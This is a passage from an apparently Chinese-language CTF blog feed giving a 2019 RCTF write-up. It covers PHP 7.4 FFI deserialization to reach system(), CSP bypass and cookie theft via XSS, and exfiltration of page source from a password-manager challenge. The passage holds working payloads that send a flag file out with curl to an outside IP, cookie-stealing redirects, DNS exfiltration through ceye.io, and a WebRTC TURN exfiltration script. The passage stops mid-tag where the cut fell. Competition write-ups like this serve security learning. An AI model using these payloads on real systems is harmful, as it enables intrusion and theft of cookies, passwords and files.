class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client.getPlayerID = <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> &#123;<span class="string">'$a=1;require(`child_process`).exec(`command`);'</span>: <span class="string">""</span>, <span class="attr">toHexString</span>: <span class="number">1</span>, <span class="attr">id</span>: &#123;<span class="attr">length</span>: <span class="number">12</span>&#125;&#125;&#125;</span><br><span class="line">Client.requestData()</span><br></pre></td></tr></table></figure><p>此处对node还是不熟悉，后面应该加强，回去看node和mongo了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;这次的题目真的让我学了好久，哈哈&lt;/p&gt;
&lt;p&gt;环境部署：&lt;br&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 rctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/14/2019-rctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/14/2019-rctf-writeup/</id>
    <published>2019-09-14T15:48:30.000Z</published>
    <updated>2019-09-14T16:06:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学到了好多</p><h2 id="0x01-nextphp"><a href="#0x01-nextphp" class="headerlink" title="0x01 nextphp"></a>0x01 nextphp</h2><ol><li>解题思路</li></ol><p>根据标题nextphp和php的版本为php7.4，从而判断出目标是利用了php7.4的某种新特性</p><ol start="2"><li>解题过程</li></ol><p>首先进行信息搜集<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看phpinfo发现被disable了所有已知可以执行命令的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure></p><p>但是发现在编译PHP时开启了ffi并且ffi是enable的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;./configure&apos; &apos;--build=x86_64-linux-gnu&apos; &apos;--with-config-file-path=/usr/local/etc/php&apos; &apos;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&apos; &apos;--with-ffi&apos; &apos;--enable-option-checking=fatal&apos; &apos;--with-mhash&apos; &apos;--enable-ftp&apos; &apos;--enable-mbstring&apos; &apos;--enable-mysqlnd&apos; &apos;--with-password-argon2&apos; &apos;--with-sodium&apos; &apos;--with-curl&apos; &apos;--with-libedit&apos; &apos;--with-openssl&apos; &apos;--with-zlib&apos; &apos;--with-pear&apos; &apos;--with-libdir=lib/x86_64-linux-gnu&apos; &apos;--with-apxs2&apos; &apos;--disable-cgi&apos; &apos;build_alias=x86_64-linux-gnu&apos;</span><br></pre></td></tr></table></figure></p><p>但是为了安全php7.4中ffi不能直接使用，因此不能直接借助eval，但是发现当前目录存在preload.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=var_dump(scandir(%27./%27));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=var_dump(base_convert(fileperms(%27./%27),10,8));</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(5) &quot;40755&quot;</span><br></pre></td></tr></table></figure><p>发现并不可写<br>利用ffi来引入libc中的system函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(eval(&apos;FFI::cdef(&quot;int system(const char *command);&quot;, &quot;libc.so.6&quot;)-&gt;system(&quot;ls&quot;);&apos;));</span><br></pre></td></tr></table></figure></p><p>但是反序列化中的run只有一个参数选项，后面发现system的执行不需要引入so文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(eval(&apos;FFI::cdef(&quot;int system(const char *command);&quot;)-&gt;system(&quot;ls&quot;);&apos;));</span><br></pre></td></tr></table></figure></p><p>成功精简，从而构造如下exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $data = [</span><br><span class="line"><span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line"><span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line"><span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line"><span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line"><span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public function __set ($key, $value) &#123;</span></span><br><span class="line"><span class="comment">//     throw new \Exception('No implemented');</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// public function __construct () &#123;</span></span><br><span class="line"><span class="comment">//     throw new \Exception('No implemented');</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line">$ser = base64_encode(serialize($a));</span><br><span class="line">var_dump($ser);</span><br></pre></td></tr></table></figure></p><p>利用curl带外传输得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=%27QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319%27;$b=unserialize(base64_decode($a));$b-%3Eret-%3Esystem(%27curl%20-i%20http://47.90.204.28:2345/`cat%20/flag|base64`%27);</span><br></pre></td></tr></table></figure></p><h2 id="0x02-jail"><a href="#0x02-jail" class="headerlink" title="0x02 jail"></a>0x02 jail</h2><p>思路很明确就是要让bot访问我们的链接然后交出cookie，因此就考虑怎么打cookie</p><p>首先看一下CSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: sandbox allow-scripts allow-same-origin; base-uri &apos;none&apos;;default-src &apos;self&apos;;script-src &apos;unsafe-inline&apos; &apos;self&apos;;connect-src &apos;none&apos;;object-src &apos;none&apos;;frame-src &apos;none&apos;;font-src data: &apos;self&apos;;style-src &apos;unsafe-inline&apos; &apos;self&apos;;</span><br></pre></td></tr></table></figure></p><p>如下payload可以在firefox上打到cookie，但是在chrome上是打不到cookie的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&quot;location.href=&apos;http://47.90.204.28:8080/?&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://ae01.alicdn.com/kf/H0efd773688214817af5760f957053cf8y.png" alt></p><p>根据提示flag在cookie里面，所以接下来让bot去打就好了，但是bot打不到，所以bot有可能是chrome写的。那么转换思路。</p><p>PS: CSP在跳转面前是苍白无力的</p><p>但是<code>document.location</code>被freeze了</p><p>但是发现host和hostname属性都是可以改的，而且可以达到一个跳转的效果。因此采用DNS来做带外传输。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(val == <span class="string">""</span>)</span><br><span class="line">        val = str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        val += str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">location.hostname=stringToHex(<span class="built_in">document</span>.cookie).substr(<span class="number">0</span>,<span class="number">60</span>)+<span class="string">".bjslfd.ceye.io"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>最终通过分段读取获得flag</p><p>RCTF{welc0me_t0_the_chaos_w0r1}</p><p>此外还有第二种解法</p><p>之前我们注意到CSP中有个 connect-src ‘none’; 那么有没有办法bypass掉这一点呢，答案是肯定的</p><p>参考：<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(&#123;<span class="string">"iceServers"</span>:[&#123;<span class="string">"urls"</span>:[<span class="string">"turn:74.125.140.127:19305?transport=udp"</span>],<span class="string">"username"</span>:<span class="string">"_all_your_data_belongs_to_us"</span>,<span class="string">"credential"</span>:<span class="string">"."</span>&#125;]&#125;);</span><br><span class="line">pc.createOffer().then(<span class="function">(<span class="params">sdp</span>)=&gt;</span>pc.setLocalDescription(sdp);</span><br></pre></td></tr></table></figure><p>修改上面提到的poc</p><p>sudo turnserver  -L 172.16.47.44 -a -u zeroyu:123456 -v -f -r 106.14.114.127</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iceCallback</span>(<span class="params">event</span>) </span>&#123;&#125;</span><br><span class="line">config = &#123;</span><br><span class="line"><span class="string">"iceServers"</span>: [&#123;</span><br><span class="line"><span class="string">"urls"</span>: [<span class="string">"turn:47.90.204.28:8080"</span>],</span><br><span class="line"><span class="string">"username"</span>: <span class="built_in">document</span>.cookie,</span><br><span class="line"><span class="string">"credential"</span>: <span class="string">"zeroyu"</span></span><br><span class="line">&#125;],</span><br><span class="line"><span class="string">"iceTransportPolicy"</span>: <span class="string">"all"</span>,</span><br><span class="line"><span class="string">"iceCandidatePoolSize"</span>: <span class="string">"0"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> offerOptions = &#123;</span><br><span class="line">offerToReceiveAudio: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Creating new PeerConnection with config=<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(config)&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// config是用来设置链接turn服务器使用的</span></span><br><span class="line">pc = <span class="keyword">new</span> RTCPeerConnection(config);</span><br><span class="line"><span class="comment">// onicecandidate 是收到 icecandidate 事件时调用的事件处理器.。当一个 RTCICECandidate 对象被添加时，这个事件被触发。</span></span><br><span class="line">pc.onicecandidate = iceCallback;</span><br><span class="line">pc.createOffer(</span><br><span class="line">offerOptions</span><br><span class="line">).then(</span><br><span class="line">gotDescription,</span><br><span class="line">noDescription</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gotDescription</span>(<span class="params">desc</span>) </span>&#123;</span><br><span class="line">pc.setLocalDescription(desc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noDescription</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Error creating offer: '</span>, error);</span><br><span class="line">&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这种方式在本地macOS上没有成功，随后可以在服务器上试一下</p><h2 id="0x03-password"><a href="#0x03-password" class="headerlink" title="0x03 password"></a>0x03 password</h2><p>进一步要求使用利用xss打到对后台的密码，但是密码不是使用chrome的AutoSave，此处写payload1不要用chrome，一定要用firefox，不然什么都打不到（感觉可能是最新版的chrome限制了这种跳转，必须点击一下才能跳）</p><p>依据上面的思路还是先分段读源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui large form"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui stacked segment"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"user icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> id=<span class="string">"username"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"lock icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"password"</span> id=<span class="string">"password"</span> autocomplete=<span class="string">"on"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> &gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui fluid large submit button"</span> type=<span class="string">"submit"</span>&gt;Login&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui error message"</span> style=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(val == <span class="string">""</span>)</span><br><span class="line">        val = str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        val += str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   location.hostname=stringToHex(btoa(<span class="built_in">document</span>.body.innerHTML)).substr(<span class="number">1800</span>,<span class="number">60</span>)+<span class="string">".bjslfd.ceye.io"</span>;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>之后源码中会多出<code>data-cip-id</code>属性，从而判断是<code>ChromeIPass+Keepass</code>，那么之后就是定位+点击完成密码填充工作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui large form"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui stacked segment"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"user icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> id=<span class="string">"username"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"lock icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"password"</span> id=<span class="string">"password"</span> autocomplete=<span class="string">"on"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> &gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui fluid large submit button"</span> type=<span class="string">"submit"</span>&gt;Login&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui error message"</span> style=<span 